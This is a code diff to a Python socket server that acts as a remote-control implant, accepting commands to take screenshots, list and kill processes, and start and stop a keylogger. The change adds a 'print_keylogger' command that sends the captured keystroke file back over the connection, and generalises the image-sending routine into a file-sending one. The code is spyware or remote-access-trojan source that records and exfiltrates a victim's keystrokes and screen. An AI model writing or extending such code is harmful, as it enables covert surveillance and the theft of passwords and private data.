@@ -13,6 +13,11 @@ CMD_VIEW_PROCESSES = 'view_processes'
 CMD_KILL_PROCESS = 'kill_process'
 CMD_START_KEYLOGGER = 'start_keylogger'
 CMD_STOP_KEYLOGGER = 'stop_keylogger'
+CMD_PRINT_KEYLOGGER = 'print_keylogger'
+
+# FLAGS
+FLAG_FILE_END = 'FILE_END'
+FLAG_PROCESSES_END = 'PROCESSES_END'
 
 # BUFFER
 BUFFER_SIZE = 1024
@@ -51,13 +56,13 @@ class Server:
 
       elif data == CMD_TAKE_SCREENSHOT.encode():
         self.take_screenshot()
-        self.send_image(os.path.join(TMP_PATH, 'screenshot.png'), conn)
+        self.send_file(os.path.join(TMP_PATH, 'screenshot.png'), conn)
 
       elif data == CMD_VIEW_PROCESSES.encode():
         processes = self.get_all_processes()
         conn.send(processes.encode())
         time.sleep(0.01)
-        conn.send(b'PROCESSES_END')
+        conn.send(FLAG_PROCESSES_END.encode())
 
       elif data == CMD_KILL_PROCESS.encode():
         pid = conn.recv(BUFFER_SIZE).decode()
@@ -70,7 +75,10 @@ class Server:
       elif data == CMD_STOP_KEYLOGGER.encode():
         print('Stopping keylogger')
         self.stop_keylogger()
-        
+      
+      elif data == CMD_PRINT_KEYLOGGER.encode():
+        print('Printing keylogger')
+        self.send_file(os.path.join(TMP_PATH, 'keylog.txt'), conn)
 
     conn.close()
     print(f"[DISCONNECTED] {addr} disconnected.")
@@ -85,7 +93,7 @@ class Server:
     screenshot = pyautogui.screenshot()
     screenshot.save(os.path.join(TMP_PATH, 'screenshot.png'))
   
-  def send_image(self, path, conn):
+  def send_file(self, path, conn):
     if os.path.exists(path):
       f = open(path, 'rb')
       bytes = f.read(BUFFER_SIZE)
@@ -94,7 +102,7 @@ class Server:
         bytes = f.read(BUFFER_SIZE)
       time.sleep(0.05)
       f.close()
-      conn.send(b'IMAGE_END')
+      conn.send(FLAG_FILE_END.encode())
 
   def get_all_processes(self):
     return os.popen('wmic process get description, processid, threadcount').read()
